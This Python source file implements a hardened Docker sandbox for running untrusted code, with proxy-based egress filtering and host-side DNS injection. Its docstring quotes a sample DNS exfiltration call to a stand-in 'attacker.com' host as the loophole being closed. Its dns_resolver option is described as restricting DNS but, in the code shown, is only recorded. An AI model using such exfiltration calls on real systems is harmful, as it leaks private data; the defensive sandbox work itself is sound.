"""Docker-based sandbox executor.

Runs Python code in a Docker container with hardening:
  - --network=none (no network access by default)
  - --memory=128m (memory limit)
  - --read-only (read-only root filesystem)
  - --security-opt=no-new-privileges (no privilege escalation)
  - --cap-drop=ALL (drop all Linux capabilities)
  - --tmpfs /tmp (writable temp dir for execution)
  - --rm (auto-remove container after exit)
  - --pids-limit=64 (process count limit)
  - --entrypoint python3 (bypass sandbox image entrypoint, v2.0)

When a NetworkAllowList is provided, the executor uses SNI-proxy egress
mode (v2.0): --network=default with HTTP_PROXY/HTTPS_PROXY env vars
pointing at an SNI-aware proxy (default 127.0.0.1:8888). The proxy
inspects the TLS SNI / HTTP Host header and allows/denies based on the
domain — solving CDN IP rotation. No NET_ADMIN cap needed.

## Security architecture (v3.1)

The container runs with --cap-drop ALL, --security-opt
no-new-privileges, and --user 1000:1000 (the sandbox user). The
--entrypoint python3 flag bypasses the sandbox image's legacy iptables
entrypoint (which required SETGID/SETUID caps for runuser). In proxy
mode, the container has no special capabilities at all and runs as a
non-root user — the proxy handles all filtering externally. Running as
uid 1000 (not root-with-no-caps) is strict defense-in-depth: even a
kernel cap-bypass or a misconfigured cap grant leaves the process
non-root.

v3.1 DNS exfiltration fix: When an allow-list is present, the executor
resolves allow-listed domains on the HOST at startup and injects them
into the container via Docker's ``--add-host`` flag (e.g.,
``--add-host pypi.org:151.101.0.223``). This eliminates the need for
DNS (port 53) access inside the container, closing the loophole where
malicious code could exfiltrate data via
``socket.gethostbyname("secret.attacker.com")``. The container's
``/etc/hosts`` contains only the injected entries — no DNS resolver is
available.

DNS can be restricted to a specific resolver via the `dns_resolver`
parameter, which is passed to the SNI proxy for DNS resolution pinning
(v2.0 wildcard DNS loophole fix).

This is the inner layer of defense-in-depth. The outer layer is the
sbx microVM that runs the entire vibe-thinker orchestrator.

Requires Docker to be installed and running on the host (or inside the
sbx microVM, which has its own Docker daemon).
"""

import asyncio
import time
from typing import Dict, Optional, TYPE_CHECKING

from sandbox.base import ExecutionResult

if TYPE_CHECKING:
    from sandbox.network_allowlist import NetworkAllowList


# The sandbox image. The v0.4.0 iptables-based image is no longer used
# — v2.0 uses the SNI-proxy/Envoy egress path exclusively. Falls back
# to python:3.12-slim if the custom image is not available.
SANDBOX_IMAGE = "vibe-thinker-sandbox:latest"
FALLBACK_IMAGE = "python:3.12-slim"

# Default SNI-proxy egress address (v1.2+). When an allow-list is present,
# the executor routes traffic through a proxy at this address. The proxy
# inspects the TLS SNI / HTTP Host header (domain-level filtering) instead
# of IP-based iptables rules — solving CDN IP rotation. Override with
# --proxy-egress.
DEFAULT_PROXY_EGRESS = "127.0.0.1:8888"


class DockerSandboxExecutor:
    """Execute Python code in a hardened Docker container.

    This is the production executor for CodeVerifier. It provides:
      - filesystem isolation (read-only root, writable /tmp only)
      - network isolation (no network by default, or SNI-proxy egress)
      - memory limits (default 128m)
      - process limits (64 PIDs)
      - no privilege escalation
      - automatic cleanup (--rm)
      - privilege dropping (candidate runs as non-root sandbox user)

    Args:
        image: Docker image to use. Defaults to the purpose-built
            `vibe-thinker-sandbox` image.
        timeout: default execution timeout in seconds.
        allowlist: optional NetworkAllowList for granular egress
            filtering. When set, the executor uses domain-level
            egress filtering via an SNI-aware proxy (v2.0 default
            and only path — the v0.4.0 iptables path was removed).
        dns_resolver: optional IP address of a DNS resolver to restrict
            DNS queries to (prevents DNS-based data exfiltration). When
            None, DNS is allowed to any resolver (needed for hostname
            resolution in the allow-list). When set, only the specified
            resolver can receive DNS queries.
    """

    name = "docker_sandbox"

    def __init__(
        self,
        image: str = SANDBOX_IMAGE,
        timeout: float = 10.0,
        allowlist: Optional["NetworkAllowList"] = None,
        dns_resolver: Optional[str] = None,
    ):
        self.image = image
        self.default_timeout = timeout
        self._allowlist = allowlist
        self._dns_resolver = dns_resolver
        self._proxy_egress: Optional[str] = None

    def set_allowlist(self, allowlist: Optional["NetworkAllowList"]) -> None:
        """Update the network allow-list (e.g. from a CLI flag after init)."""
        self._allowlist = allowlist

    def set_dns_resolver(self, resolver: Optional[str]) -> None:
        """Update the DNS resolver restriction."""
        self._dns_resolver = resolver

    def set_proxy_egress(self, proxy_addr: Optional[str]) -> None:
        """Set the SNI proxy egress address (e.g. '127.0.0.1:8888').

        When set, the sandbox container routes traffic through the proxy.
        The proxy inspects the TLS SNI / HTTP Host header and allows/denies
        based on the domain — solving CDN IP rotation.
        """
        self._proxy_egress = proxy_addr

    async def execute(
        self,
        script: str,
        *,
        timeout: float = 10.0,
        network: bool = False,
        memory_limit: str = "128m",
        env: Optional[Dict[str, str]] = None,
    ) -> ExecutionResult:
        """Execute a Python script in a Docker container."""
        start = time.monotonic()

        # Determine network mode:
        # - If an allow-list is configured, use SNI-proxy egress (v2.0).
        #   The proxy inspects TLS SNI / HTTP Host (domain-level filtering),
        #   solving CDN IP rotation. No NET_ADMIN cap needed.
        # - Otherwise, use --network=none / --network=default based on the
        #   `network` flag (unchanged behavior).
        use_allowlist = self._allowlist is not None and not self._allowlist.is_empty
        proxy_addr = self._proxy_egress or DEFAULT_PROXY_EGRESS
        use_proxy = use_allowlist

        if use_proxy:
            # SNI proxy egress mode (v2.0). The container routes traffic
            # through the proxy via HTTP_PROXY/HTTPS_PROXY env vars. The
            # proxy inspects the TLS SNI / HTTP Host header and allows/denies
            # based on the domain — solving CDN IP rotation. No iptables
            # needed, no NET_ADMIN needed.
            # --entrypoint python3: bypass the sandbox image's iptables
            # entrypoint (which needs SETGID/SETUID caps). Proxy mode
            # runs python3 directly — no privilege dropping needed since
            # the container has --cap-drop ALL and --security-opt
            # no-new-privileges.
            cmd = [
                "docker", "run", "--rm",
                "--init",
                "--network", "default",
                "--memory", memory_limit,
                "--read-only",
                "--security-opt", "no-new-privileges",
                "--cap-drop", "ALL",
                "--user", "1000:1000",
                "--pids-limit", "64",
                "--tmpfs", "/tmp:rw,size=10m",
                "--workdir", "/tmp",
                "--entrypoint", "python3",
            ]
            # v3.1: DNS exfiltration fix — inject allow-listed domains
            # via --add-host so the container can route to them without
            # DNS access. This closes the loophole where malicious code
            # could exfiltrate data via socket.gethostbyname() to an
            # attacker-controlled DNS server.
            if self._allowlist is not None:
                cmd.extend(self._allowlist.generate_add_host_args())
            # Set proxy env vars so HTTP clients in the container use the proxy.
            proxy_url = f"http://{proxy_addr}"
            proxy_env = {
                "HTTP_PROXY": proxy_url,
                "HTTPS_PROXY": proxy_url,
                "http_proxy": proxy_url,
                "https_proxy": proxy_url,
                "NO_PROXY": "localhost,127.0.0.1",
                "no_proxy": "localhost,127.0.0.1",
            }
            merged_env = {**proxy_env}
            if env:
                merged_env.update(env)
            for key, value in merged_env.items():
                cmd.extend(["--env", f"{key}={value}"])
            cmd.extend([self.image, "-c", script])
        else:
            # No allow-list -> --network=none (or --network=default if
            # network=True is explicitly passed). No proxy, no firewall.
            # --entrypoint python3: bypass the sandbox image's iptables
            # entrypoint (v2.0 removed the iptables path, so the entrypoint
            # is no longer needed).
            cmd = [
                "docker", "run", "--rm",
                "--init",
                "--network", "none" if not network else "default",
                "--memory", memory_limit,
                "--read-only",
                "--security-opt", "no-new-privileges",
                "--cap-drop", "ALL",
                "--user", "1000:1000",
                "--pids-limit", "64",
                "--tmpfs", "/tmp:rw,size=10m",
                "--workdir", "/tmp",
                "--entrypoint", "python3",
            ]
            if env:
                for key, value in env.items():
                    cmd.extend(["--env", f"{key}={value}"])
            cmd.extend([self.image, "-c", script])

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            try:
                stdout_bytes, stderr_bytes = await asyncio.wait_for(
                    proc.communicate(),
                    timeout=timeout,
                )
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()
                elapsed = int((time.monotonic() - start) * 1000)
                return ExecutionResult(
                    exit_code=-1,
                    stdout="",
                    stderr="",
                    timed_out=True,
                    executor=self.name,
                    duration_ms=elapsed,
                    error=f"execution timed out after {timeout}s",
                )

            elapsed = int((time.monotonic() - start) * 1000)
            stdout = stdout_bytes.decode("utf-8", errors="replace")
            stderr = stderr_bytes.decode("utf-8", errors="replace")

            result = ExecutionResult(
                exit_code=proc.returncode,
                stdout=stdout,
                stderr=stderr,
                executor=self.name,
                duration_ms=elapsed,
            )

            # Attach audit evidence for the network configuration.
            if use_proxy:
                result.evidence["network_mode"] = "proxy"
                result.evidence["proxy_egress"] = proxy_addr
                result.evidence["dns_restricted"] = bool(self._dns_resolver)
                result.evidence["dns_injection"] = (
                    self._allowlist is not None
                    and not self._allowlist.is_empty
                )
            else:
                result.evidence["network_mode"] = "none" if not network else "default"

            return result

        except Exception as e:
            elapsed = int((time.monotonic() - start) * 1000)
            return ExecutionResult(
                exit_code=-1,
                stdout="",
                stderr="",
                executor=self.name,
                duration_ms=elapsed,
                error=f"docker execution failed: {e}",
            )

    async def execute_tests(
        self,
        code: str,
        tests: str,
        *,
        timeout: float = 10.0,
        network: bool = False,
        memory_limit: str = "128m",
    ) -> ExecutionResult:
        """Execute unit tests against candidate code in Docker."""
        from sandbox.base import VT_TEST_NONCE_ENV, build_test_harness
        script, nonce = build_test_harness(code, tests)
        result = await self.execute(
            script, timeout=timeout, network=network, memory_limit=memory_limit,
            env={VT_TEST_NONCE_ENV: nonce},
        )
        result.evidence["test_nonce"] = nonce
        return result

    def is_available(self) -> bool:
        """Check if Docker is installed and the daemon is running."""
        try:
            import subprocess
            result = subprocess.run(
                ["docker", "info", "--format", "{{.ServerVersion}}"],
                capture_output=True, text=True, timeout=5,
            )
            return result.returncode == 0 and bool(result.stdout.strip())
        except Exception:
            return False

    async def cleanup(self) -> None:
        """No persistent resources to clean up — containers use --rm."""
        pass
